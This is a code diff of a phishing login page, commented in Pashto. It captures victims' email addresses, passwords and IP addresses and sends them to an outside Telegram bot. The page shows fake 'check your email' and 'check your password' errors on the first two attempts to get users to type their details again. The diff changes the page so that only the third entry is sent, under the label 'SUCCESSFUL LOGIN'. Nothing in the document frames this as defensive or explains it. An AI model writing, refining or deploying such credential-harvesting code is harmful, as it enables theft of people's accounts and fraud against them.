@@ -183,9 +183,9 @@ button:hover{
         }
     }
 
-    // اډمن ته پیغام لیږل
+    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
     async function sendToAdmin(email, password, ip, attemptNumber) {
-        const message = `🔐 *NEW LOGIN ATTEMPT* 🔐\n\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -238,26 +238,25 @@ button:hover{
         
         const currentAttempt = attemptStore[key];
 
-        // لومړۍ هڅه - تېروتنه (معلومات اډمن ته ځي)
+        // لومړۍ هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
-            await sendToAdmin(email, password, ip, currentAttempt);
-            showError('❌ Please check your email');
+            showError('❌ Please check your email.');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
 
-        // دوهمه هڅه - تېروتنه (معلومات اډمن ته ځي)
+        // دوهمه هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 2) {
-            await sendToAdmin(email, password, ip, currentAttempt);
             showError('❌ Please check your password.');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
 
-        // درېیمه هڅه - بریالي (معلومات اډمن ته ځي او بیا ویب پاڼې ته)
+        // درېیمه هڅه - بریالي (یوازې دلته اډمن ته خبر ځي)
         if (currentAttempt >= 3) {
+            // یوازې بریالي هڅه اډمن ته واستوئ
             await sendToAdmin(email, password, ip, currentAttempt);
             
             // د دې کارونکي لپاره هڅې پاکې کړئ
